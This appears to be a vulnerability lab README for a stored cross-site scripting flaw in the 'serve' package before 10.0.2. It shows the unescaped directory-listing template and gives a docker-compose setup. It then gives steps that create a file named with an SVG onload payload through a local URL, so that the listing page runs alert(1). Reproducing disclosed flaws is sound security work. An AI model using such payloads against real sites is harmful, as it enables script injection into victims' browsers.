# Cross-Site Scripting @ serve package
- module : serve
- version : < 10.0.2
- severity: Medium

# Installation

`docker-compose up --build`

# Details

the problem is that the template which the module is using used file names without sanitizing 
```html
<a href="{{=value.relative}}" title="{{=value.title}}" class="{{=value.ext}}">{{=value.base}}</a>
```
so if a file is named `"><svg onload=alert(1);>` for example, an alert will popup once we open the page that lists files in the directory.

# Lunch Attack

1. open the Browser and enter the following url `http://localhost:4000/create-file?name=%22%3E%3Csvg%20onload%3Dalert%281%29%3B%3E` 
    this will create file with name `"><svg onload=alert(1);>`

2. open the Browser and enter the following url `http://localhost:3000/` an alert will popup once we open the page that lists files in the directory 
    that mean the attack passed successfully.
